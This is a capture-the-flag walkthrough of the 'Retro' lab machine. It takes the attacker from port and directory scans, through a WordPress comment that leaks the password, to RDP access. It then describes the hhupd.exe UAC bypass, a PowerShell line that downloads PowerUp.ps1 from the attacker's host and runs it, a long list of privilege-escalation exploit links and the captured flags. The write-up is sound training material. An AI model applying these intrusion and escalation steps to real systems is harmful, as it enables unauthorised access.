# Retro

## Q1 A web server is running on the target. What is the hidden directory which the website lives on?

```
root@ip-10-67-76-166:~# nmap -p- -Pn 10.67.158.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-13 07:34 UTC
Nmap scan report for ip-10-67-158-14.ec2.internal (10.67.158.14)
Host is up (0.00035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 129.39 seconds
root@ip-10-67-76-166:~# 
```
- RDP and web service available.
```
# gobuster dir -u http://10.67.158.14:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.158.14:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 152] [--> http://10.67.158.14:80/retro/]
/Retro                (Status: 301) [Size: 152] [--> http://10.67.158.14:80/Retro/]
Progress: 873100 / 873104 (100.00%)
===============================================================
Finished
===============================================================
root@ip-10-67-76-166:~# 
```

Answer: /retro

Closer inspection of retro folder: 

- Clearly appears to be a word press website with login page
- By just visiting <target-IP>/retro and a quick look finds a section 'One Comment on "Ready Player One"' by Author Wade, its easy to find the password "parzival" in a comment left by the Author.
- Gobuster is over kill at this point apart from knowing that this username and password can allow access to the admin section of the Word Press site.
- Username:Password also work to gain RDP access with user.txt is on Desktop.
```
xfreerdp /u:wade /p:parzival /v:<targetIP>
```
First here was the Gobuster findings below that is the User.txt file from the desktop, which appears to be in base64.
```
# gobuster dir -u http://10.67.158.14/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.158.14/retro
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 160] [--> http://10.67.158.14/retro/wp-content/]
/license.txt          (Status: 200) [Size: 19935]
/wp-includes          (Status: 301) [Size: 161] [--> http://10.67.158.14/retro/wp-includes/]
/README.html          (Status: 200) [Size: 7447]
/index.php            (Status: 301) [Size: 0] [--> http://10.67.158.14/retro/]
/readme.html          (Status: 200) [Size: 7447]
/wp-login.php         (Status: 200) [Size: 2743]
/Index.php            (Status: 301) [Size: 0] [--> http://10.67.158.14/retro/Index.php/]
/LICENSE.txt          (Status: 200) [Size: 19935]
/License.txt          (Status: 200) [Size: 19935]
/wp-trackback.php     (Status: 200) [Size: 135]
/INDEX.php            (Status: 301) [Size: 0] [--> http://10.67.158.14/retro/INDEX.php/]
/wp-admin             (Status: 301) [Size: 158] [--> http://10.67.158.14/retro/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/ReadMe.html          (Status: 200) [Size: 7447]
/Readme.html          (Status: 200) [Size: 7447]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://localhost/retro/wp-login.php?action=register]
Progress: 873100 / 873104 (100.00%)
===============================================================
Finished
===============================================================
```
User.txt contains 3b99fbdc6d430bfb51c72c651a261927. 

**Taking look in recycling bin there is a file hhupd so what is it? **

hhupd.exe is a Windows executable that has been associated with CVE-2019-1388, a UAC bypass technique. Researchers and training material often use hhupd.exe as an example of an elevated GUI application that can be abused to obtain an Administrator shell.

Full explanation: https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f

This however is broken for this module the idea is right click run as administrator then view a link in default browser as or app and since neither can be selected even when you set default web browser to google chrome/or iexplorer. This should lead to browser launched with as "System with a 404 Verisign" website being displayed. Save the webpage by clicking on the gear, File, Save as… You will be prompted with and error “Location is not available.” Click OK. Then go to windows\system32 folder and select the cmd.exe and open with right click. From there CMD access with user level NT Authority\system.

Alternatively there dozens of methods to reverse shell access, such as via the wordpress appearance>theme editor using a Ivan Sincek php shell from revshells.com, or meterpreter payloads with msfvenom but had trouble escalating (getsystem failed). 

So had a closer look

systeminfo and wmic qfe and found:

Starting with wmic qfe 

HotFix ID     : KB3192137
Description   : Update
Installed By  : NT AUTHORITY\SYSTEM
Installed On  : 09/12/2016
System        : RETROWEB

Microsoft KB  : https://support.microsoft.com/?kbid=3192137

Literally just one hot fix as old as the OS. This opens doors for exploits. To get idea of OS version, 'systeminfo' is more detailed than 'winver' but both provide enough here.

C:\Users\Wade>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393

C:\Users\Wade> 

Observation:
  Very few updates installed.
  Build 14393 is a known target for CVE-2017-0213.
  Investigated CVE-2017-0213 as a potential local privilege escalation vector.


But first Try a few options to find exploit opertunities:

PowerUp.ps1 (unfortunately several options, all list canrestart as false nothing immediately obvious here)

```
PS C:\Users\Wade> Invoke-webrequest -Uri http://10.67.95.37:80/PowerUp.ps1 -outfile powerups.ps1
PS C:\Users\Wade> . .\powerups.ps1
PS C:\Users\Wade> Invoke-AllChecks


ServiceName    : AWSLiteAgent
...
CanRestart     : False
...
Check          : Unquoted Service Paths
...
```
Next Windows Exploit Suggester WES-NG, prior I looked for kernel eploits, but I did see the same one exploit used from one site on other write ups from https://github.com/secwiki/windows-kernel-exploits. So I planned to find something unique.
```
# git clone https://github.com/bitsadmin/wesng --depth 1

~/wesng# python3 wes.py ../sysinfo.txt  -i "Elevation of Privilege" --exploits-only
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2016
    - Generation: 2016
    - Build: 14393
    - Version: 1607
    - Architecture: x64-based
    - Installed hotfixes (1): KB3192137
[+] Loading definitions
    - Creation date of definitions: 20261009
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[!] Found vulnerabilities!

Date: 20250708
CVE: CVE-2025-47987
KB: KB
Title: Credential Security Support Provider Protocol (CredSSP) Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Cred SSProvider Protocol
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/52541

Date: 20161108
CVE: CVE-2016-7225
KB: KB3200970
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2016
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40764

Date: 20161108
CVE: CVE-2016-7225
KB: KB3200970
Title: VHD Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Virtual Hard Drive
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40764

Date: 20250513
CVE: CVE-2025-32706
KB: KB
Title: Windows Common Log File System Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Common Log File System Driver
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.vicarius.io/vsociety/posts/cve-2025-32706-detection-script-elevation-of-privilege-vulnerability-in-microsoft-windows-common-log-file-system-driver, https://www.vicarius.io/vsociety/posts/cve-2025-32706-mitigation-script-elevation-of-privilege-vulnerability-in-microsoft-windows-common-log-file-system-driver

Date: 20240813
CVE: CVE-2024-38193
KB: KB
Title: Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Ancillary Function Driver for WinSock
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/52284

Date: 20250812
CVE: CVE-2025-53149
KB: KB
Title: Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Kernel Streaming WOW Thunk Service Driver
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.crowdfense.com/cve-2025-53149-windows-ksthunk-heap-overflow/

Date: 20161108
CVE: CVE-2016-7255
KB: KB3200970
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2016
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://packetstormsecurity.com/files/140468/Microsoft-Windows-Kernel-win32k.sys-NtSetWindowLongPtr-Privilege-Escalation.html, https://github.com/mwrlabs/CVE-2016-7255, https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/

Date: 20161213
CVE: CVE-2016-7255
KB: KB3200970
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Kernel-Mode Drivers
Severity: Important
Impact: Elevation of Privilege
Exploits: http://packetstormsecurity.com/files/140468/Microsoft-Windows-Kernel-win32k.sys-NtSetWindowLongPtr-Privilege-Escalation.html, https://github.com/mwrlabs/CVE-2016-7255, https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/

Date: 20190611
CVE: CVE-2019-1069
KB: KB
Title: Task Scheduler Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://blog.0patch.com/2019/06/another-task-scheduler-0day-another.html

Date: 20250708
CVE: CVE-2025-49744
KB: KB
Title: Windows Graphics Component Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Graphics Component
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/52362

Date: 20250708
CVE: CVE-2025-49730
KB: KB
Title: Microsoft Windows QoS Scheduler Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows QoS scheduler
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/52399

Date: 20250610
CVE: CVE-2025-33073
KB: KB
Title: Windows SMB Client Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows SMB
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/52330

Date: 20170314
CVE: CVE-2017-0100
KB: KB
Title: Windows COM Session Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/41607

Date: 20161108
CVE: CVE-2016-7224
KB: KB3200970
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2016
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40765

Date: 20161213
CVE: CVE-2016-7224
KB: KB3200970
Title: VHD Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Virtual Hard Drive
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40765

Date: 20161108
CVE: CVE-2016-7226
KB: KB3200970
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2016
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40763

Date: 20161108
CVE: CVE-2016-7226
KB: KB3200970
Title: VHD Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Virtual Hard Drive
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/40763

Date: 20170314
CVE: CVE-2017-0005
KB: KB
Title: Windows GDI Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Graphics Component
Severity: Important
Impact: Elevation of Privilege
Exploit: https://blogs.technet.microsoft.com/mmpc/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/

Date: 20241210
CVE: CVE-2024-49138
KB: KB
Title: Windows Common Log File System Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Common Log File System Driver
Severity: Important
Impact: Elevation of Privilege
Exploits: https://packetstorm.news/files/id/190585/, https://www.exploit-db.com/exploits/52270

Date: 20230509
CVE: CVE-2023-29336
KB: KB
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Win32K
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/52301

Date: 20190911
CVE: CVE-2019-1215
KB: KB4516044
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47935

Date: 20190911
CVE: CVE-2019-1215
KB: KB4516044
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47935

Date: 20190911
CVE: CVE-2019-1215
KB: KB
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47935

Date: 20190911
CVE: CVE-2019-1215
KB: KB4516044
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47935

Date: 20190911
CVE: CVE-2019-1215
KB: KB4516044
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47935

Date: 20200512
CVE: CVE-2020-1048
KB: KB
Title: Windows Print Spooler Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: http://packetstormsecurity.com/files/159217/Microsoft-Spooler-Local-Privilege-Elevation.html

Date: 20200512
CVE: CVE-2020-1054
KB: KB
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Graphics Component
Severity: Important
Impact: Elevation of Privilege
Exploit: http://packetstormsecurity.com/files/160515/Microsoft-Windows-DrawIconEx-Local-Privilege-Escalation.html

Date: 20250409
CVE: CVE-2025-29824
KB: KB
Title: Windows Common Log File System Driver Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Windows Common Log File System Driver
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.vicarius.io/vsociety/posts/cve-2025-29824-windows-common-log-file-system-driver-elevation-of-privilege-vulnerability-detection-script, https://www.vicarius.io/vsociety/posts/cve-2025-29824-windows-common-log-file-system-driver-elevation-of-privilege-vulnerability-mitigation-script

Date: 20190611
CVE: CVE-2019-0943
KB: KB
Title: Windows ALPC Elevation of Privilege Vulnerability
Affected product: Windows Server 2016
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://exploit-db.com/exploits/47029

[-] Missing patches: 3
    - KB: patches 17 vulnerabilities
    - KB3200970: patches 8 vulnerabilities
    - KB4516044: patches 4 vulnerabilities
[I] KB with the most recent release date
    - ID: KB
    - Release date: 20250812
[+] Done. Displaying 29 of the 3761 vulnerabilities found.
root@ip-10-67-101-103:~/wesng# 

```
Several stand out:
- CVE-2016-7255
- CVE-2017-0100
- CVE-2017-0213
- CVE-2019-0943

But I think number one here is the way to go. Will try the exploit-db address last listed in exploits.
```
Date: 20161108
CVE: CVE-2016-7255
KB: KB3200970
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2016
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://packetstormsecurity.com/files/140468/Microsoft-Windows-Kernel-win32k.sys-NtSetWindowLongPtr-Privilege-Escalation.html, https://github.com/mwrlabs/CVE-2016-7255, https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/
```
After several tries reverrted to one others online all seem to use on this THM target.
- CVE-2017-0213
- Guess I value time more than originality.

Root flag 7958b569565d7bd88d10c6f22d1c4063
